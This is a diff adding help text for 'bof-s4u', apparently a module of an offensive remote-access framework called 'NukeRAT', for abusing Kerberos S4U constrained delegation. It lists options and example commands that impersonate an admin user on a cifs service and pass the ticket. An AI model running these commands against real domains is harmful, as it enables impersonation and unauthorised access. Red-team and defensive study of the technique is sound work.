@@ -1,0 +1,14 @@
+ABOUT
+    Perform S4U2self and S4U2proxy constrained delegation abuse.
+USAGE:
+    bof-s4u --- /ticket:BASE64 /service:SPN {/impersonateuser:USER | /tgs:BASE64} [/domain:DOMAIN] [/dc:DC] [/altservice:SERVICE] [/ptt] [/nopac] [/opsec] [/self]
+
+EXAMPLES:
+    bof-s4u --- /ticket:BASE64 /service:cifs/target /impersonateuser:admin /ptt
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    bof-s4u -w 60 --- /ticket:BASE64 /service:cifs/target /impersonateuser:admin /ptt
